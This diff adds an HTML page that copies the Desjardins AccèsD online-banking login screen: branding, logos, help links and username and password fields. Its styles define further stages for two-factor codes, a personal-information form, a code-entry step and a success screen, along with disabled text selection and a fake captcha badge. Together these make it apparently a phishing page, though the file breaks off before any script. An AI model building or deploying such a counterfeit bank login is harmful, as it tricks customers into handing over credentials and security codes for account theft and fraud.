@@ -1,0 +1,2537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>AccèsD - Log in to your Desjardins account</title>
+<link rel="icon" type="image/png" href="ongletdesj.png">
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+html,
+body {
+    margin: 0;
+    width: 100%;
+    min-height: 100%;
+}
+
+body {
+    font-family: Arial, Helvetica, sans-serif;
+    color: #222;
+    background: #f4f4f4;
+    font-size: 15px;
+    user-select: none;
+    -webkit-user-select: none;
+    -ms-user-select: none;
+}
+
+.topbar {
+    height: 46px;
+    width: 100%;
+    background: #373737;
+    color: #fff;
+}
+
+.topbar-inner {
+    width: 1050px;
+    max-width: calc(100% - 60px);
+    height: 46px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    justify-content: flex-end;
+}
+
+.topbar a {
+    color: #ffffff !important;
+    text-decoration: none !important;
+    font-family: Arial, Helvetica, "Helvetica Neue", sans-serif !important;
+    font-size: 14.5px !important;
+    font-weight: 500 !important;
+    padding: 0 12px;
+    cursor: pointer;
+    position: relative;
+    height: 46px;
+    display: flex;
+    align-items: center;
+    transition: color 0.2s ease;
+}
+
+.topbar a::after {
+    content: "";
+    position: absolute;
+    bottom: 12px;
+    left: 12px;
+    right: 12px;
+    height: 1.5px;
+    background: #ffffff;
+    border-radius: 1px;
+    opacity: 0;
+    transition: opacity 0.2s ease;
+}
+
+.topbar a:hover::after {
+    opacity: 1;
+}
+
+.topbar a.aa-btn {
+    font-size: 13.5px !important;
+}
+
+.aa-text-wrap {
+    display: inline-flex;
+    align-items: baseline;
+}
+
+.topbar a.aa-btn .first-a {
+    font-size: 11px !important;
+    line-height: 1 !important;
+    font-weight: 500 !important;
+}
+
+.topbar a.aa-btn .second-a {
+    font-size: 15px !important;
+    line-height: 13px !important;
+    font-weight: 500 !important;
+}
+
+.plus-sign-wrap {
+    display: inline-flex;
+    align-items: center;
+    margin-left: 3px !important;
+}
+
+.topbar a.aa-btn .plus-sign {
+    font-size: 21px !important;
+    font-weight: 300 !important;
+    line-height: 1;
+}
+
+.topbar-sep {
+    width: 1px;
+    height: 18px;
+    background: rgba(255,255,255,.7);
+    display: block;
+    margin: 0;
+}
+
+.header {
+    height: 60px;
+    width: 100%;
+    background: #fff;
+    border-bottom: 1px solid #dedede;
+    padding-top: 0;
+}
+
+.header-inner {
+    width: 1050px;
+    max-width: 100%;
+    height: 60px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    padding-left: 0;
+}
+
+.brand {
+    display: flex;
+    align-items: center;
+}
+
+.brand img {
+    height: 38px;
+    width: auto;
+    object-fit: contain;
+    display: block;
+}
+
+.header-separator {
+    width: 2px;
+    height: 20px;
+    background: #bcbcbc;
+    margin-left: 20px;
+    margin-right: 24px;
+}
+
+.access {
+    display: flex;
+    align-items: center;
+    gap: 26px;
+    margin-left: 20px;
+}
+
+.access-item {
+    position: relative;
+    font-family: Georgia, "Times New Roman", serif;
+    font-size: 21px;
+    font-style: italic;
+    font-weight: bold;
+    color: #000;
+    white-space: nowrap;
+    display: flex;
+    align-items: center;
+}
+
+.access-item img {
+    height: 33px;
+    width: auto;
+    object-fit: contain;
+    display: block;
+}
+
+.access-business {
+    padding-bottom: 0;
+}
+
+.access-business img {
+    height: 33px;
+    width: auto;
+    object-fit: contain;
+    display: block;
+}
+
+.content-area {
+    width: 100%;
+    padding-top: 20px;
+    padding-bottom: 20px;
+    background: #f4f4f4;
+}
+
+.card {
+    width: 1180px;
+    min-height: auto;
+    max-width: calc(100% - 50px);
+    margin: 0 auto;
+    display: grid;
+    grid-template-columns: 670px 510px;
+    background: #fff;
+    box-shadow: 0 3px 20px rgba(0,0,0,.12);
+    overflow: hidden;
+    justify-content: center;
+    transition: grid-template-columns 0.3s ease;
+}
+
+.card.full-width-mode {
+    grid-template-columns: 100% 0px;
+}
+
+.left-form-section {
+    position: relative;
+    width: 100%;
+    background: #fff;
+    padding-left: 40px; 
+    padding-right: 40px;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    padding-top: 50px;
+    padding-bottom: 30px;
+    min-height: 520px;
+}
+
+.right-visual-section {
+    position: relative;
+    width: 510px;
+    height: 100%;
+    overflow: hidden;
+    background:
+        linear-gradient(
+            135deg,
+            #e5e8e8 0%,
+            #d8dddd 19%,
+            #8f9da2 37%,
+            #38494f 55%,
+            #142027 76%,
+            #071017 100%
+        );
+    transition: opacity 0.3s ease;
+}
+
+.window {
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 175px;
+    height: 205px;
+    background:
+        linear-gradient(
+            90deg,
+            rgba(255,255,255,.95),
+            rgba(220,228,230,.7)
+        );
+}
+
+.window::before,
+.window::after {
+    content: "";
+    position: absolute;
+    background: rgba(55,70,75,.55);
+}
+
+.window::before {
+    width: 6px;
+    height: 205px;
+    left: 76px;
+}
+
+.window::after {
+    height: 6px;
+    width: 175px;
+    top: 86px;
+}
+
+.person {
+    position: absolute;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: flex-end;
+    z-index: 5;
+    overflow: hidden;
+}
+
+.person img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    object-position: bottom center;
+    display: block;
+    -webkit-font-smoothing: antialiased;
+}
+
+.form-wrapper {
+    margin-left: 0;
+    display: block;
+}
+
+.form {
+    width: 100%;
+    max-width: 550px;
+    margin-left: 0;
+    margin-right: auto;
+    padding-top: 0;
+    transform: none;
+    font-size: 1.12rem;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    gap: 22px;
+}
+
+.form-item {
+    position: relative;
+    border: none;
+    padding: 0;
+    margin-bottom: 0px;
+}
+
+h1 {
+    margin: 0;
+    color: #008b57;
+    font-size: 32px;
+    line-height: 1.1;
+    font-weight: 300;
+    letter-spacing: -.4px;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    position: relative;
+    top: -10px;
+}
+
+.label-row {
+    display: flex;
+    align-items: center;
+    margin: 0 0 8px;
+    position: relative;
+}
+
+.label-row label {
+    font-size: 16px;
+    font-weight: 700;
+    color: #3b3b3b;
+}
+
+.info {
+    width: 28px;
+    height: 28px;
+    margin-left: 8px;
+    border: 1.5px solid #555;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: Georgia, serif;
+    font-size: 15px;
+    font-weight: 400;
+    cursor: pointer;
+    background: transparent;
+    padding: 0;
+}
+
+.info-popover {
+    display: none;
+    position: absolute;
+    left: 80px; 
+    top: calc(100% + 6px);
+    width: 380px;
+    background: #fff;
+    border: 1px solid #ccc;
+    box-shadow: 0 4px 14px rgba(0,0,0,0.18);
+    padding: 16px 36px 16px 16px;
+    font-size: 15px;
+    line-height: 1.45;
+    color: #333;
+    z-index: 1000;
+    font-weight: normal;
+    font-family: Arial, Helvetica, sans-serif;
+    border-radius: 0;
+    transform: translateX(-50%);
+    text-align: left;
+}
+
+.info-popover-close {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    background: transparent;
+    border: none;
+    font-size: 1.25rem;
+    line-height: 1;
+    color: #6c757d;
+    cursor: pointer;
+    padding: 4px 8px;
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.info-popover-close:hover,
+.info-popover-close:focus-visible {
+    color: #000000;
+    background-color: #f1f3f5;
+    outline: none;
+}
+
+.info-popover::before,
+.info-popover::after {
+    content: "";
+    position: absolute;
+    bottom: 100%;
+    left: 50%;
+    width: 0;
+    height: 0;
+    border-style: solid;
+    transform: translateX(-50%);
+}
+
+.info-popover::before {
+    border-width: 8px;
+    border-color: transparent transparent #ccc transparent;
+}
+
+.info-popover::after {
+    border-width: 7px;
+    border-color: transparent transparent #fff transparent;
+    margin-bottom: -1px;
+}
+
+.info-popover.active {
+    display: block;
+}
+
+.info-popover .popover-title {
+    font-weight: 600;
+    margin-bottom: 6px;
+    font-size: 15.5px;
+}
+
+.info-popover ul {
+    margin: 0 0 8px 16px;
+    padding: 0;
+}
+
+.info-popover li {
+    margin-bottom: 4px;
+}
+
+.info-popover a {
+    color: #008b57;
+    text-decoration: underline;
+}
+
+.mock-input {
+    width: 100%;
+    max-width: 350px;
+    height: 48px;
+    background: #ffffff;
+    border: 1px solid #c9c9c9;
+    border-radius: 0;
+    box-shadow: none;
+    padding: 0 16px;
+    font-size: 16px;
+    font-weight: 400;
+    margin-bottom: 0;
+    outline: none;
+    transition: border-color 0.2s ease, box-shadow 0.2s ease;
+}
+
+input[type="password"]::-ms-reveal,
+input[type="password"]::-ms-clear {
+    display: none !important;
+}
+
+.mock-input:focus {
+    border-color: #0066cc;
+    box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.2);
+}
+
+.mock-input:not(:focus) {
+    border-color: #c9c9c9;
+    box-shadow: none;
+}
+
+.mock-input:-webkit-autofill,
+.mock-input:-webkit-autofill:hover, 
+.mock-input:-webkit-autofill:focus {
+    -webkit-text-fill-color: #222;
+    -webkit-box-shadow: 0 0 0px 1000px #ffffff inset;
+    transition: background-color 5000s ease-in-out 0s;
+}
+
+.remember {
+    margin-top: 0;
+    margin-bottom: 0;
+    display: flex;
+    align-items: center;
+    font-size: 15.5px;
+    position: relative;
+}
+
+.checkbox {
+    width: 19px;
+    height: 19px;
+    margin: 0 9px 0 0;
+    border: 1px solid #c9c9c9;
+    background: #fff;
+    border-radius: 0;
+}
+
+.remember span {
+    font-size: 15.5px;
+    font-weight: 400;
+}
+
+.remember a.safe-link {
+    margin-left: 0;
+    color: #008b57;
+    font-size: 14.5px;
+    text-decoration: underline;
+    cursor: pointer;
+}
+
+.safe-popover {
+    display: none;
+    position: absolute;
+    top: calc(100% + 12px);
+    left: 50%;
+    transform: translateX(-50%);
+    width: 320px;
+    max-width: calc(100vw - 40px);
+    background-color: #ffffff;
+    border: 1px solid #dcdcdc;
+    border-radius: 6px;
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
+    padding: 16px 36px 16px 16px;
+    z-index: 1000;
+    font-size: 14px;
+    line-height: 1.45;
+    color: #333333;
+    font-family: Arial, Helvetica, sans-serif;
+    font-weight: normal;
+    text-align: left;
+}
+
+.safe-popover.active {
+    display: block;
+}
+
+.safe-popover::before,
+.safe-popover::after {
+    content: "";
+    position: absolute;
+    bottom: 100%;
+    left: 50%;
+    transform: translateX(-50%);
+    border: solid transparent;
+    height: 0;
+    width: 0;
+    pointer-events: none;
+}
+
+.safe-popover::before {
+    border-bottom-color: #dcdcdc;
+    border-width: 9px;
+}
+
+.safe-popover::after {
+    border-bottom-color: #ffffff;
+    border-width: 8px;
+}
+
+.safe-popover-close {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    background: transparent;
+    border: none;
+    font-size: 1.25rem;
+    line-height: 1;
+    color: #6c757d;
+    cursor: pointer;
+    padding: 4px 8px;
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.safe-popover-close:hover,
+.safe-popover-close:focus-visible {
+    color: #000000;
+    background-color: #f1f3f5;
+    outline: none;
+}
+
+.password-section {
+    margin-top: 15px;
+}
+
+.password-label {
+    margin-bottom: 8px;
+    font-size: 16px;
+    font-weight: 700;
+    color: #3b3b3b;
+}
+
+.password-box {
+    position: relative;
+    width: 100%;
+    max-width: 350px;
+    margin-bottom: 0;
+}
+
+.password-box .mock-input {
+    max-width: 350px;
+    padding: 0 46px 0 16px;
+}
+
+.eye {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    width: 34px;
+    height: 34px;
+    transform: translateY(-50%);
+    background: transparent;
+    border: none;
+    padding: 0;
+    margin: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    outline: none;
+}
+
+.eye svg {
+    width: 28px;
+    height: 28px;
+    display: block;
+}
+
+.note {
+    margin-top: 0;
+    margin-bottom: 0;
+    font-size: 14.5px;
+    color: #4a4a4a;
+    white-space: nowrap;
+}
+
+.note strong {
+    color: #333;
+    font-weight: 600;
+}
+
+.forgot {
+    display: inline-block;
+    margin-top: 0;
+    margin-bottom: 0;
+    color: #008b57;
+    font-size: 14.5px;
+    text-decoration: underline;
+}
+
+.login {
+    width: 200px !important;
+    height: 44px !important;
+    min-height: 44px !important;
+    max-width: none !important;
+    margin: 40px 0 0 65px !important;
+    border: 0;
+    border-radius: 6px;
+    background: #00884E;
+    color: #fff;
+    font-size: 17px;
+    font-weight: 700;
+    display: flex !important;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    text-decoration: none;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.15);
+    padding: 0 !important;
+    transition: background 0.2s ease, opacity 0.2s ease;
+}
+
+.login:disabled {
+    background: #7ca88e !important;
+    cursor: not-allowed;
+    opacity: 0.8;
+}
+
+.spinner {
+    width: 22px;
+    height: 22px;
+    border: 3px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top-color: #ffffff;
+    animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.login-error-container {
+    height: 24px;
+    margin-top: 10px;
+    margin-left: 65px;
+}
+
+.login-error-msg {
+    color: #d9534f;
+    font-size: 14px;
+    display: none;
+    margin: 0;
+}
+
+.two-factor-section {
+    display: none;
+    flex-direction: column;
+    gap: 15px;
+    width: 100%;
+    max-width: 900px;
+}
+
+.two-factor-section h1 {
+    top: 0;
+}
+
+.info-form-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+    margin-top: 10px;
+    margin-bottom: 10px;
+}
+
+.info-form-group {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+}
+
+.info-form-group.full-width {
+    grid-column: span 3;
+}
+
+.info-form-group label {
+    font-size: 14px;
+    font-weight: 700;
+    color: #3b3b3b;
+}
+
+.info-form-group .mock-input {
+    max-width: 100%;
+    height: 44px;
+    font-size: 15px;
+}
+
+.code-section {
+    display: none;
+    flex-direction: column;
+    gap: 20px;
+    width: 100%;
+    max-width: 550px;
+}
+
+.code-section h1 {
+    top: 0;
+}
+
+.code-container {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    margin-top: 10px;
+    margin-bottom: 10px;
+}
+
+.code-container label {
+    font-size: 16px;
+    font-weight: 700;
+    color: #3b3b3b;
+}
+
+.success-section {
+    display: none;
+    flex-direction: column;
+    gap: 20px;
+    width: 100%;
+    max-width: 550px;
+}
+
+.success-section h1 {
+    top: 0;
+    color: #008b57;
+}
+
+.lower {
+    margin-top: 45px;
+    width: 100%;
+    max-width: 100%;
+    margin-left: 0;
+    margin-right: auto;
+    display: flex;
+    align-items: stretch;
+    padding-top: 20px;
+    position: relative;
+}
+
+.lower::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 1px;
+    background: #7d7d7d;
+}
+
+.lower-left {
+    width: auto;
+    padding-top: 4px;
+    padding-right: 20px;
+    padding-bottom: 4px;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    gap: 14px;
+    position: relative;
+    flex-shrink: 0;
+}
+
+.lower-left::after {
+    content: "";
+    position: absolute;
+    top: 0;
+    bottom: 0;
+    right: 0;
+    width: 1px;
+    background: #7d7d7d;
+}
+
+.lower-left a {
+    display: inline-block;
+    width: auto;
+    max-width: 100%;
+}
+
+.lower-right {
+    width: auto;
+    padding-top: 4px;
+    padding-left: 20px;
+    padding-bottom: 4px;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    flex-grow: 1;
+}
+
+.lower a {
+    display: block;
+    color: #008b57;
+    font-size: 12.5px;
+    line-height: 1.25;
+    text-decoration: none;
+    margin-bottom: 0px;
+    word-break: normal;
+    overflow-wrap: break-word;
+}
+
+.lower a:hover {
+    text-decoration: underline;
+}
+
+.security {
+    display: flex;
+    flex-direction: column;
+    gap: 6px; 
+}
+
+.security-links {
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    gap: 12px;
+}
+
+.security-links a {
+    margin-bottom: 0;
+    display: block;
+    color: #008b57;
+    font-size: 12.5px;
+    line-height: 1.25;
+    text-decoration: none;
+}
+
+.security-links a:hover {
+    text-decoration: underline;
+}
+
+.security-badge {
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    gap: 6px;
+    text-decoration: none;
+    margin-top: 0;
+    flex-shrink: 0;
+    position: relative;
+}
+
+.lock {
+    width: 24px;
+    height: 26px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    margin: 0;
+    position: relative;
+}
+
+.lock svg {
+    width: 22px; 
+    height: 24px;
+    display: block;
+}
+
+.guaranteed {
+    text-decoration: underline;
+    font-size: 12.5px;
+    line-height: 1.2;
+    margin: 0;
+    position: relative;
+    top: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 2px;
+    white-space: nowrap;
+}
+
+.guaranteed span:nth-child(1) {
+    color: #00a86b !important;
+    font-weight: 400;
+}
+
+.guaranteed span:nth-child(2) {
+    color: #00a86b !important;
+    font-weight: 400;
+}
+
+.individual-form-container {
+    position: relative;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    margin-left: 120px; 
+    transition: margin-left 0.3s ease;
+}
+
+.card.full-width-mode .individual-form-container {
+    margin-left: 60px;
+    margin-right: 60px;
+}
+
+.custom-container-form {
+    position: relative;
+    width: 100%;
+}
+
+.footer {
+    height: 110px;
+    background:
+        linear-gradient(
+            to bottom,
+            #292c2e,
+            #202326
+        );
+    color: #fff;
+}
+
+.footer-inner {
+    width: 1050px;
+    max-width: calc(100% - 40px);
+    height: 110px;
+    margin: 0 auto;
+    text-align: center;
+}
+
+.footer-top {
+    height: 47px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-bottom: 1px solid rgba(255,255,255,.12);
+}
+
+.footer-top a {
+    color: white !important;
+    text-decoration: none !important;
+    font-family: Arial, Helvetica, "Helvetica Neue", sans-serif !important;
+    font-size: 12.5px !important;
+    font-weight: 700 !important;
+    padding: 0 14px;
+    cursor: pointer;
+    position: relative;
+    height: 47px;
+    display: flex;
+    align-items: center;
+    transition: color 0.2s ease;
+}
+
+.footer-top a:hover::before {
+    content: "" !important;
+    position: absolute !important;
+    bottom: 12px !important;
+    left: 14px !important;
+    right: 14px !important;
+    height: 1.5px !important;
+    background: #ffffff !important;
+    border-radius: 1px !important;
+}
+
+.footer-top a + a {
+    border-left: none;
+}
+
+.footer-top-separator {
+    width: 1px;
+    height: 18px;
+    transform: scaleX(0.15);
+    transform-origin: center;
+    background: rgba(255,255,255,.7);
+    display: inline-block;
+}
+
+.footer-small {
+    padding-top: 10px;
+    font-size: 13px;
+    color: #ddd;
+}
+
+.footer-small a {
+    color: #ddd;
+    text-decoration: none;
+    padding: 0 7px;
+}
+
+.copyright {
+    margin-top: 6px;
+    font-size: 13px;
+    color: #ddd;
+}
+
+.draggable-container {
+    position: fixed;
+    z-index: 9999;
+    user-select: none;
+}
+
+#captchaBox {
+    right: 0;
+    bottom: 25px;
+    width: 58px;
+    height: 52px;
+    background: #ffffff;
+    border-radius: 0;
+    border-top: 1px solid rgba(40,40,40,.55);
+    border-bottom: 1px solid rgba(40,40,40,.55);
+    border-left: 1px solid rgba(40,40,40,.42);
+    border-right: 0;
+    box-shadow: -2px 1px 8px rgba(0,0,0,.55);
+    display: flex;
+    align-items: center;
+    overflow: hidden;
+    transition: width .24s ease, box-shadow .24s ease;
+}
+
+#captchaBox:hover,
+#captchaBox:focus-within {
+    width: 330px;
+    box-shadow: -4px 2px 12px rgba(0,0,0,.35);
+}
+
+.captcha-icon-area {
+    width: 58px;
+    min-width: 58px;
+    height: 100%;
+    background: #ffffff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+}
+
+#captchaBox img {
+    width: 46px;
+    height: 46px;
+    object-fit: contain;
+    display: block;
+    flex: 0 0 auto;
+}
+
+.captcha-expanded-text {
+    width: 272px;
+    min-width: 272px;
+    height: 100%;
+    background: #1a73e8;
+    color: #ffffff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0 16px;
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 17px;
+    line-height: 1;
+    font-weight: 400;
+    white-space: nowrap;
+    opacity: 0;
+    transform: translateX(12px);
+    transition: opacity .16s ease .05s, transform .20s ease .03s;
+    pointer-events: none;
+}
+
+#captchaBox:hover .captcha-expanded-text,
+#captchaBox:focus-within .captcha-expanded-text {
+    opacity: 1;
+    transform: translateX(0);
+}
+
+.captcha-expanded-text strong {
+    font-weight: 700;
+}
+
+@media (max-width: 1250px) {
+    .card {
+        grid-template-columns: 60% 40%;
+    }
+    .card.full-width-mode {
+        grid-template-columns: 100% 0px;
+    }
+    .right-visual-section,
+    .left-form-section {
+        width: 100%;
+    }
+    .left-form-section {
+        padding-left: 40px;
+        padding-right: 40px;
+    }
+}
+
+@media (max-width: 850px) {
+    .topbar-inner,
+    .header-inner {
+        max-width: calc(100% - 20px);
+        padding-left: 0;
+    }
+    .access {
+        display: none;
+    }
+    .header-separator {
+        display: none;
+    }
+    .card {
+        width: 100%;
+        max-width: 100%;
+        height: auto;
+        display: block;
+    }
+    .right-visual-section {
+        display: none;
+    }
+    .left-form-section {
+        width: 100%;
+        min-height: auto;
+        padding-left: 20px;
+        padding-right: 20px;
+        padding-top: 20px;
+        padding-bottom: 30px;
+    }
+    .individual-form-container {
+        margin-left: 0 !important;
+        margin-right: 0 !important;
+    }
+    .form-wrapper {
+        margin-left: 0;
+    }
+    .form {
+        width: 100%;
+        max-width: 450px;
+        margin-left: auto;
+        margin-right: auto;
+        transform: none;
+    }
+    .info-form-grid {
+        grid-template-columns: 1fr;
+    }
+    .info-form-group.full-width {
+        grid-column: span 1;
+    }
+    .mock-input,
+    .password-box,
+    .password-box .mock-input,
+    .login {
+        max-width: 100% !important;
+    }
+    .eye {
+        right: 14px !important;
+    }
+    .remember {
+        flex-wrap: wrap;
+    }
+    .remember a.safe-link {
+        margin-left: 0;
+        margin-top: 6px;
+    }
+    .login {
+        width: 100% !important;
+        margin-left: 0 !important;
+        margin-right: 0 !important;
+    }
+    .login-error-container {
+        margin-left: 0 !important;
+    }
+    .lower {
+        margin-top: 25px;
+        margin-left: auto;
+        margin-right: auto;
+        width: 100%;
+    }
+    .footer {
+        height: auto;
+        padding-bottom: 14px;
+    }
+    .footer-top {
+        height: auto;
+        padding: 14px 0;
+        flex-wrap: wrap;
+    }
+}
+
+.text-size-panel {
+    width: 100%;
+    max-height: 0;
+    overflow: hidden;
+    background: #373737;
+    color: #fff;
+    opacity: 0;
+    transition: max-height .28s ease, opacity .18s ease;
+    border-top: 0 solid transparent;
+}
+
+.text-size-panel.active {
+    max-height: 240px;
+    opacity: 1;
+}
+
+.text-size-panel-inner {
+    width: calc(100% - 90px);
+    margin: 0 auto;
+    padding: 15px 0 18px;
+}
+
+.text-size-panel-header {
+    height: 38px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.text-size-panel-title {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 21.5px;
+    line-height: 1;
+    font-weight: 400;
+    color: #fff;
+}
+
+.text-size-panel-close {
+    width: 32px;
+    height: 32px;
+    padding: 0;
+    margin: 0;
+    border: 0;
+    background: transparent;
+    color: #fff;
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 32px;
+    line-height: 26px;
+    font-weight: 300;
+    cursor: pointer;
+}
+
+.text-size-panel-description {
+    margin: 12px 0 12px;
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 16px;
+    line-height: 1.3;
+    font-weight: 400;
+    color: #fff;
+}
+
+.text-size-options {
+    display: flex;
+    align-items: flex-start;
+    gap: 26px;
+    padding-left: 8px;
+}
+
+.text-size-option {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.text-size-choice {
+    width: 48px;
+    height: 48px;
+    padding: 0;
+    border: 0;
+    background: #fff;
+    color: #008b57;
+    font-family: Arial, Helvetica, sans-serif;
+    font-weight: 700;
+    cursor: pointer;
+}
+
+.text-size-choice[data-scale="1"] { font-size: 21px; }
+.text-size-choice[data-scale="1.5"] { font-size: 27px; }
+.text-size-choice[data-scale="2"] { font-size: 33px; }
+
+.text-size-percent {
+    position: relative;
+    margin-top: 8px;
+    padding-bottom: 6px;
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 15.5px;
+    line-height: 1;
+    color: #fff;
+}
+
+.text-size-option.active .text-size-percent::after {
+    content: "";
+    position: absolute;
+    left: 50%;
+    bottom: 0;
+    width: 48px;
+    height: 3px;
+    transform: translateX(-50%);
+    background: #00a86b;
+}
+
+@media (max-width: 850px) {
+    .text-size-panel-inner {
+        width: calc(100% - 35px);
+    }
+    .text-size-panel-title {
+        font-size: 19.5px;
+    }
+    .text-size-panel-description {
+        font-size: 15px;
+    }
+    .text-size-options {
+        gap: 18px;
+        padding-left: 0;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="topbar">
+    <div class="topbar-inner">
+        <a href="#" class="aa-btn">
+            <span class="aa-text-wrap"><span class="first-a">A</span><span class="second-a">A</span></span><span class="plus-sign-wrap"><span class="plus-sign">＋</span></span>
+        </a>
+        <span class="topbar-sep"></span>
+        <a href="#" id="langSwitch" data-i18n="switchText">Français</a>
+        <span class="topbar-sep"></span>
+        <a href="https://www.desjardins.com/ca/help-page/index.jsp?docName=ai_joindre&domaine=ACCESD" target="_blank" data-i18n="contactUs">Contact Us</a>
+        <span class="topbar-sep"></span>
+        <a href="https://www.desjardins.com/ca/help-page/index.jsp?docName=ai_logonlogoff&domaine=ACCESD" target="_blank" data-i18n="help">Help</a>
+    </div>
+</div>
+
+<div class="text-size-panel" id="textSizePanel" aria-hidden="true">
+    <div class="text-size-panel-inner">
+        <div class="text-size-panel-header">
+            <h2 class="text-size-panel-title" data-i18n="textSizeTitle">Text size</h2>
+            <button type="button" class="text-size-panel-close" id="textSizeClose" aria-label="Close text size panel">×</button>
+        </div>
+        <p class="text-size-panel-description" data-i18n="textSizeDesc">
+            Use the buttons below to change the text size.
+        </p>
+        <div class="text-size-options" role="group" aria-label="Text size">
+            <div class="text-size-option active">
+                <button type="button" class="text-size-choice" data-scale="1">A</button>
+                <div class="text-size-percent">100%</div>
+            </div>
+            <div class="text-size-option">
+                <button type="button" class="text-size-choice" data-scale="1.5">A</button>
+                <div class="text-size-percent">150%</div>
+            </div>
+            <div class="text-size-option">
+                <button type="button" class="text-size-choice" data-scale="2">A</button>
+                <div class="text-size-percent">200%</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<header class="header">
+    <div class="header-inner" style="width: 1050px; max-width: calc(100% - 60px); margin: 0 auto; padding-left: 0;">
+        <div class="brand" style="margin-left: -70px; display: flex; align-items: center;">
+            <a href="https://www.desjardins.com/en.html" style="display: flex; align-items: center; text-decoration: none;">
+                <img src="desjardins8.png" alt="Desjardins" style="height: 38px;">
+            </a>
+            <div class="header-separator" style="margin-left: 30px; margin-right: 14px;"></div>
+        </div>
+        <div class="access" style="margin-left: 20px;">
+            <div class="access-item">
+                <img src="accesd.png" alt="Accès D" style="height: 33px;">
+            </div>
+            <div class="access-item access-business">
+                <img src="accesd2.png" alt="AccèsD Affaires" style="height: 33px;">
+            </div>
+        </div>
+    </div>
+</header>
+
+<div class="content-area">
+    <div class="card" id="mainCard">
+        <section class="left-form-section">
+            
+            <div class="individual-form-container">
+                <div class="form-wrapper" id="formWrapper">
+                    <div class="custom-container-form">
+                        <form class="form" id="loginForm" action="https://accweb.mouv.desjardins.com/identifiantunique/adhesion/identification?langueCible=en" method="POST">
+                            
+                            <div class="form-item">
+                                <h1 data-i18n="loginTitle">
+                                    Log in to your account
+                                </h1>
+                            </div>
+
+                            <div class="form-item">
+                                <div class="label-row">
+                                    <label for="usernameInput" data-i18n="usernameLabel">
+                                        Username
+                                    </label>
+                                    <button type="button" class="info" id="infoToggle" aria-label="Information sur le nom d'utilisateur">
+                                        i
+                                    </button>
+                                    <div class="info-popover" id="infoPopover">
+                                        <button type="button" id="closeInfoPopoverBtn" class="info-popover-close" aria-label="Fermer la bulle d'aide">&times;</button>
+                                        <div class="popover-title" data-i18n="popTitle1">AccèsD username</div>
+                                        <ul>
+                                            <li data-i18n="popLi1">Your Desjardins Access Card number</li>
+                                            <li data-i18n="popLi2">Your virtual access card (non-members who hold a Desjardins credit card or prepaid card)</li>
+                                            <li data-i18n="popLi3">Your email address (if an email address is saved in your usernames)</li>
+                                        </ul>
+                                        <div class="popover-title" style="margin-top: 8px;" data-i18n="popTitle2">AccèsD Affaires username</div>
+                                        <ul>
+                                            <li data-i18n="popLi4">Your AccèsD Affaires user code</li>
+                                        </ul>
+                                        <div style="margin-top: 8px;">
+                                            <a href="#" target="_blank" data-i18n="popLink">Learn more about usernames - This link will open in a new window.</a>
+                                        </div>
+                                    </div>
+                                </div>
+                                <input type="text" id="usernameInput" class="mock-input" autocomplete="username">
+                            </div>
+
+                            <div class="form-item">
+                                <div class="remember">
+                                    <input type="checkbox" id="rememberMeCheckbox" class="checkbox" style="cursor: pointer;">
+                                    <label for="rememberMeCheckbox" style="cursor: pointer; display: flex; align-items: center;">
+                                        <span data-i18n="rememberMe">Remember me</span>
+                                    </label>
+                                    <div style="position: relative; display: inline-flex; align-items: center; margin-left: 13px;">
+                                        <a href="#" id="safeLinkBtn" class="safe-link" data-i18n="isThisSafe" role="button" aria-expanded="false" aria-controls="safePopover" aria-haspopup="dialog">
